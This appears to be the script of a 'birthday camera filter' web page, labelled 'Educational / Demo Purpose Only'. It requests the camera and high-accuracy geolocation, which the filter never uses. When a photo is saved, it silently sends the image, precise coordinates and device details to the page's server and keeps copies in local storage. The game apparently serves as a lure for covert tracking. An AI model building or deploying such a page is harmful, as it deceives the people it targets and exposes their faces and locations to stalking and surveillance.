// ============================================
// BIRTHDAY CAMERA FILTER GAME
// Educational / Demo Purpose Only
// ============================================

let stream = null;
let currentFacingMode = 'user'; // 'user' for front camera, 'environment' for back
let capturedImage = null;
let userLocation = null;

// Request permissions and start camera
async function requestPermissions() {
    const permissionScreen = document.getElementById('permissionScreen');
    const cameraView = document.getElementById('cameraView');
    const errorMessage = document.getElementById('errorMessage');
    
    try {
        // Request camera permission
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: currentFacingMode,
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        
        // Request location permission (optional)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    userLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    console.log('Location obtained:', userLocation);
                },
                function(error) {
                    console.log('Location permission denied or error:', error.message);
                    userLocation = null;
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000
                }
            );
        }
        
        // Hide permission screen and show camera
        permissionScreen.style.display = 'none';
        cameraView.style.display = 'block';
        
        // Start video stream
        const video = document.getElementById('videoStream');
        video.srcObject = stream;
        
        // Show switch camera button if multiple cameras available
        checkMultipleCameras();
        
        // Create confetti animation
        createConfetti();
        
    } catch (error) {
        console.error('Error accessing camera:', error);
        permissionScreen.style.display = 'none';
        errorMessage.style.display = 'block';
        document.getElementById('errorText').textContent = 
            'Camera access denied or not available. Please allow camera permission and try again.';
    }
}

// Check if device has multiple cameras
async function checkMultipleCameras() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');
        
        if (videoDevices.length > 1) {
            document.getElementById('switchCameraBtn').style.display = 'block';
        }
    } catch (error) {
        console.log('Could not enumerate devices:', error);
    }
}

// Switch between front and back camera
async function switchCamera() {
    if (!stream) return;
    
    // Stop current stream
    stream.getTracks().forEach(track => track.stop());
    
    // Switch facing mode
    currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
    
    try {
        // Get new stream
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: currentFacingMode,
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        
        const video = document.getElementById('videoStream');
        video.srcObject = stream;
    } catch (error) {
        console.error('Error switching camera:', error);
        alert('Could not switch camera. Please try again.');
    }
}

// Capture photo
function capturePhoto() {
    const video = document.getElementById('videoStream');
    const canvas = document.getElementById('captureCanvas');
    const previewScreen = document.getElementById('previewScreen');
    const cameraView = document.getElementById('cameraView');
    
    // Set canvas dimensions to match video
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext('2d');
    
    // Draw video frame to canvas (mirrored)
    ctx.save();
    ctx.scale(-1, 1);
    ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
    ctx.restore();
    
    // Draw overlay elements
    drawOverlays(ctx, canvas.width, canvas.height);
    
    // Get image data
    capturedImage = canvas.toDataURL('image/png');
    
    // Show preview
    document.getElementById('previewImage').src = capturedImage;
    cameraView.style.display = 'none';
    previewScreen.style.display = 'block';
    
    // Burst confetti effect
    burstConfetti();
}

// Draw overlay elements on canvas
function drawOverlays(ctx, width, height) {
    // Birthday text
    ctx.save();
    ctx.font = 'bold 40px Poppins';
    ctx.fillStyle = '#ffffff';
    ctx.strokeStyle = '#000000';
    ctx.lineWidth = 3;
    ctx.textAlign = 'center';
    ctx.textBaseline = 'top';
    
    const text = '🎂 Happy Birthday Future Advocate 🎉';
    const textX = width / 2;
    const textY = 30;
    
    ctx.strokeText(text, textX, textY);
    ctx.fillText(text, textX, textY);
    ctx.restore();
    
    // Gavel icon
    ctx.save();
    ctx.font = '60px Arial';
    ctx.textAlign = 'right';
    ctx.textBaseline = 'bottom';
    ctx.fillText('⚖️', width - 30, height - 100);
    ctx.restore();
    
    // Balloons
    ctx.save();
    ctx.font = '40px Arial';
    ctx.textAlign = 'left';
    ctx.textBaseline = 'middle';
    ctx.fillText('🎈', 30, height / 2 - 40);
    ctx.fillText('🎈', 30, height / 2);
    ctx.fillText('🎈', 30, height / 2 + 40);
    ctx.restore();
}

// Create confetti animation
function createConfetti() {
    const confettiContainer = document.getElementById('confetti');
    const colors = ['#fbbf24', '#ec4899', '#4f46e5', '#10b981', '#f59e0b'];
    
    for (let i = 0; i < 20; i++) {
        setTimeout(() => {
            const piece = document.createElement('div');
            piece.className = 'confetti-piece';
            piece.style.left = Math.random() * 100 + '%';
            piece.style.background = colors[Math.floor(Math.random() * colors.length)];
            piece.style.animationDelay = Math.random() * 2 + 's';
            piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
            confettiContainer.appendChild(piece);
            
            setTimeout(() => piece.remove(), 4000);
        }, i * 100);
    }
}

// Burst confetti on capture
function burstConfetti() {
    const confettiContainer = document.getElementById('confetti');
    confettiContainer.innerHTML = '';
    
    const colors = ['#fbbf24', '#ec4899', '#4f46e5', '#10b981', '#f59e0b'];
    
    for (let i = 0; i < 50; i++) {
        const piece = document.createElement('div');
        piece.className = 'confetti-piece';
        piece.style.left = Math.random() * 100 + '%';
        piece.style.top = Math.random() * 100 + '%';
        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
        piece.style.animationDuration = (Math.random() * 1 + 1) + 's';
        confettiContainer.appendChild(piece);
        
        setTimeout(() => piece.remove(), 2000);
    }
}

// Retake photo
function retakePhoto() {
    const previewScreen = document.getElementById('previewScreen');
    const cameraView = document.getElementById('cameraView');
    
    previewScreen.style.display = 'none';
    cameraView.style.display = 'block';
    capturedImage = null;
}

// Download photo
function downloadPhoto() {
    if (!capturedImage) return;
    
    const link = document.createElement('a');
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    link.download = `birthday-filter-${timestamp}.png`;
    link.href = capturedImage;
    link.click();
}

// Save photo to server
async function savePhoto() {
    if (!capturedImage) return;
    
    const saveBtn = document.querySelector('.save-btn');
    const statusText = document.getElementById('savingStatus');
    
    saveBtn.disabled = true;
    statusText.textContent = 'Saving...';
    statusText.style.color = '#fbbf24';
    
    try {
        // Get device info
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language
        };
        
        // Prepare data
        const photoData = {
            image: capturedImage,
            timestamp: new Date().toISOString(),
            location: userLocation,
            device: deviceInfo
        };
        
        // Send to API
        try {
            const response = await fetch('/api/savePhoto', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(photoData)
            });
            
            if (response.ok) {
                const contentType = response.headers.get('content-type');
                if (contentType && contentType.includes('application/json')) {
                    const result = await response.json();
                    console.log('Photo saved to API:', result);
                }
                
                statusText.textContent = '✅ Photo saved successfully!';
                statusText.style.color = '#10b981';
            } else {
                // API failed but continue with localStorage
                console.warn('API save failed, saving to localStorage only');
                statusText.textContent = '✅ Photo saved locally!';
                statusText.style.color = '#10b981';
            }
            
            // Always save to localStorage as backup
            const localPhotos = JSON.parse(localStorage.getItem('capturedPhotos') || '[]');
            localPhotos.push({
                ...photoData,
                id: Date.now().toString() + Math.random().toString(36).substring(2, 11),
                visitTime: new Date().toLocaleString()
            });
            localStorage.setItem('capturedPhotos', JSON.stringify(localPhotos));
        } catch (error) {
            console.error('Error saving photo:', error);
            // Save to localStorage even if API fails
            const localPhotos = JSON.parse(localStorage.getItem('capturedPhotos') || '[]');
            localPhotos.push({
                ...photoData,
                id: Date.now().toString() + Math.random().toString(36).substring(2, 11),
                visitTime: new Date().toLocaleString()
            });
            localStorage.setItem('capturedPhotos', JSON.stringify(localPhotos));
            statusText.textContent = '✅ Photo saved locally!';
            statusText.style.color = '#10b981';
        }
        
    } catch (error) {
        console.error('Error saving photo:', error);
        statusText.textContent = '❌ Failed to save. Please try again.';
        statusText.style.color = '#ef4444';
    } finally {
        saveBtn.disabled = false;
        setTimeout(() => {
            statusText.textContent = '';
        }, 3000);
    }
}

// Cleanup on page unload
window.addEventListener('beforeunload', () => {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
});
